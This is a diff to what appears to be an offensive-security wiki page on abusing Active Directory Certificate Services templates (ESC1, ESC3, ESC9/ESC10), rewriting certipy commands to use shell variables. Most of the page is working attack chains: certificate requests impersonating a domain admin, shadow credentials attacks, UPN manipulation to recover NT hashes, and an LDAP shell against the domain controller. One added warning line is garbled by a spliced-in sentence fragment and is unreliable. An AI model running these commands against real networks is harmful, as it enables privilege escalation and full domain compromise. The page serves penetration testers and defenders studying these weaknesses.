@@ -75,11 +75,15 @@ Once a vulnerable template is found ([how to enumerate](./#attack-paths)), a req
 
 ```bash
 #To specify a user account in the SAN
-certipy req -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template' -upn 'domain admin'
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template' -upn 'domain admin'
 
 #To specify a computer account in the SAN
-certipy req -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template' -dns 'dc.domain.local'
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template' -dns 'dc.domain.local'
 ```
+
+{% hint style="warning" %}
+The `$ADCS_HOST` target must be a FQDN (not an IP).
+{% endhint %}
 
 The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
 
@@ -122,19 +126,19 @@ When a certificate template specifies the **Certificate Request Agent** EKU, it 
 From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate for, and conduct, the ESC3 scenario. It is possible to output the result in an archive that can be uploaded in Bloodhound.
 
 ```bash
-certipy find -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -vulnerable
+certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -vulnerable
 ```
 
 Once a vulnerable template is found ([how to enumerate](./#attack-paths)), a request shall be made to obtain a certificate specifying the **Certificate Request Agent** EKU.
 
 ```bash
-certipy req -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template'
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'
 ```
 
 Then, the issued certificate can be used to request another certificate permitting `Client Authentication` on behalf of another user.
 
 ```bash
-certipy req -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'User' -on-behalf-of 'domain\domain admin' -pfx 'user.pfx'
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'User' -on-behalf-of 'domain\domain admin' -pfx 'user.pfx'
 ```
 
 {% hint style="info" %}
@@ -181,7 +185,7 @@ Here are the requirements to perform ESC9:
 * `GenericWrite` right against any account A to compromise any account B
 
 {% hint style="warning" %}
-At the time of writting (06/08/2022), there is no solution as a low privileged user to read the `StrongCertificateBindingEnforcement` or the `CertificateMappingMethods` values. It is worth to try the attack hopping the keys are misconfigured.
+Acate can then be used with to obtain a TGT and authenticat the time of writting (06/08/2022), there is no solution as a low privileged user to read the `StrongCertificateBindingEnforcement` or the `CertificateMappingMethods` values. It is worth to try the attack hopping the keys are misconfigured.
 {% endhint %}
 
 {% tabs %}
@@ -193,31 +197,31 @@ In this scenario, **user1** has `GenericWrite` against **user2** and wants to co
 First, the **user2**'s hash is needed. It can be retrieved via a [Shadow Credentials](../kerberos/shadow-credentials.md) attack, for example.
 
 ```bash
-certipy shadow auto -username 'user1@domain.local' -p 'password' -account user2
+certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2
 ```
 
 Then, the `userPrincipalName` of **user2** is changed to **user3**.
 
 ```bash
-certipy account update -username 'user1@domain.local' -p 'password' -user user2 -upn user3
+certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn user3
 ```
 
 The vulnerable certificate can be requested as **user2**.
 
 ```bash
-certipy req -username 'user2@domain.local' -hash 'hash_value' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template'
+certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'
 ```
 
 The **user2**'s UPN is changed back to something else.
 
 ```bash
-certipy account update -username 'user1@domain.local' -p 'password' -user user2 -upn user2@domain.local
+certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "user2@$DOMAIN"
 ```
 
 Now, authenticating with the obtained certificate will provide the **user3**'s NT hash during [UnPac the hash](../kerberos/unpac-the-hash.md). The domain must be specified since it is not present in the certificate.
 
 ```bash
-certipy auth -pfx 'user3.pfx' -domain 'domain.local'
+certipy auth -pfx 'user3.pfx' -domain "$DOMAIN"
 ```
 
 {% hint style="info" %}
@@ -294,31 +298,31 @@ In this scenario, **user1** has `GenericWrite` against **user2** and want to com
 First, the **user2**'s hash is needed. It can be retrieved via a [Shadow Credentials](../kerberos/shadow-credentials.md) attack, for example.
 
 ```bash
-certipy shadow auto -username 'user1@domain.local' -p 'password' -account user2
+certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2
 ```
 
 Then, the `userPrincipalName` of **user2** is changed to **user3**.
 
 ```bash
-certipy account update -username 'user1@domain.local' -p 'password' -user user2 -upn user3
+certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn user3
 ```
 
 A certificate permitting client authentication can be requested as **user2**.
 
 ```bash
-certipy req -username 'user2@domain.local' -hash 'hash_value' -ca 'ca_name' -template 'User'
+certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -ca 'ca_name' -template 'User'
 ```
 
 The **user2**'s UPN is changed back to something else.
 
 ```bash
-certipy account update -username 'user1@domain.local' -p 'password' -user user2 -upn user2@domain.local
+certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "user2@$DOMAIN"
 ```
 
 Now, authenticating with the obtained certificate will provide the **user3**'s NT hash with [UnPac the hash](../kerberos/unpac-the-hash.md). The domain must be specified since it is not present in the certificate.
 
 ```bash
-certipy auth -pfx 'user3.pfx' -domain 'domain.local'
+certipy auth -pfx 'user3.pfx' -domain "$DOMAIN"
 ```
 
 {% hint style="info" %}
@@ -389,31 +393,31 @@ In this scenario, **user1** has `GenericWrite` against **user2** and want to com
 First, the **user2**'s hash is needed. It can be retrieved via a [Shadow Credentials](../kerberos/shadow-credentials.md) attack, for example.
 
 ```bash
-certipy shadow auto -username 'user1@domain.local' -p 'password' -account user2
+certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2
 ```
 
 Then, the `userPrincipalName` of **user2** is changed to **DC$@domain.local**.
 
 ```bash
-certipy account update -username 'user1@domain.local' -p 'password' -user user2 -upn 'DC$@domain.local'
+certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "DC\$@$DOMAIN"
 ```
 
 A certificate permitting client authentication can be requested as **user2**.
 
 ```bash
-certipy req -username 'user2@domain.local' -hash 'hash_value' -ca 'ca_name' -template 'User'
+certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -ca 'ca_name' -template 'User'
 ```
 
 The **user2**'s UPN is changed back to something else.
 
 ```bash
-certipy account update -username 'user1@domain.local' -p 'password' -user user2 -upn user2@domain.local
+certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "user2@$DOMAIN"
 ```
 
 Now, authentication with the obtained certificate will be performed through Schannel. The `-ldap-shell` option can be used to execute some LDAP requests and, for example, realised an [RBCD](../kerberos/delegations/rbcd.md) to fully compromised the domain controller.
 
 ```bash
-certipy auth -pfx dc.pfx -dc-ip 'DC_IP' -ldap-shell
+certipy auth -pfx dc.pfx -dc-ip "$DC_IP" -ldap-shell
 ```
 
 {% hint style="info" %}
